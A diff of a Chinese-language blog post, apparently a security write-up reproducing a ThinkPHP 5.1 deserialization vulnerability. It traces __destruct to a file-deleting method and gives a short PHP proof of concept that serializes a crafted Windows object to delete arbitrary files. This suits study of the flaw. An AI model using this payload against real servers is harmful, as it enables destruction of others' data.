@@ -100,10 +100,6 @@
           <a href="/friends/">Friends</a>
         </li>
       
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
     </ul>
   </div>
 </div>
@@ -223,40 +219,19 @@
 <p>接下来全局搜索魔法函数 <code>__destruct</code>,出现了四个结果</p>
 <p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210708234436994.png" alt="image-20210708234436994"></p>
 <p>发现只有Windows.php下的函数有利用价值</p>
-<pre><code class="php">public function __destruct()
-&#123;
-    $this-&gt;close();
-    $this-&gt;removeFiles();//此处是个好东西
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();<span class="comment">//此处是个好东西</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-&#125;
-</code></pre>
 <p>跟进<code>removeFiles()</code>之后，发现该方法依然在windows这个class里</p>
-<pre><code class="php">private function removeFiles()
-&#123;
-    foreach ($this-&gt;files as $filename) &#123;//发现用到了$files这个attribute
-        if (file_exists($filename)) &#123;//检测如果这个文件存在
-            @unlink($filename);//则删除这个文件
-        &#125;
-    &#125;
-    $this-&gt;files = [];
-&#125;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;<span class="comment">//发现用到了$files这个attribute</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;<span class="comment">//检测如果这个文件存在</span></span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);<span class="comment">//则删除这个文件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>这意味着我们可以构造$files，让他执行<code>removeFiles()</code>来删除任意文件</p>
 <h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>坑点一：需要注意的是，我们需要使用与Windows类相同的namespace（命名空间），我没加，导致在这卡了好久好久。</p>
 <p>坑点二：序列化后的对象用<code>file_put_contents()</code>打出来乱码，发现是加了<code>namespace</code>后就会乱码，具体原因没有深入探究，改用echo就好了。</p>
 <p>坑点三：加入<code>namespace</code>后，private类型attribute的格式发生了变化，变成了<code>%00namespace\类名\%00属性名</code>，一个小诀窍，记不住可以右键–查看网页源代码</p>
 <p><img src="/image/ThinkPHP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210709000912218.png" alt="image-20210709000912218"></p>
 <p><strong>最后POC如下</strong></p>
-<pre><code class="php">&lt;?php
-namespace think\process\pipes;//一定要加，这是一个大坑
-class Pipes&#123;
-&#125;
-class Windows extends Pipes
-&#123;
-    private $files = [&quot;111.txt&quot;];//要删除的文件
-&#125;
-echo(serialize(new Windows()));
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;<span class="comment">//一定要加，这是一个大坑</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [<span class="string">&quot;111.txt&quot;</span>];<span class="comment">//要删除的文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>
+
 <h1 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h1><p>待更新。。</p>
 
       </div>
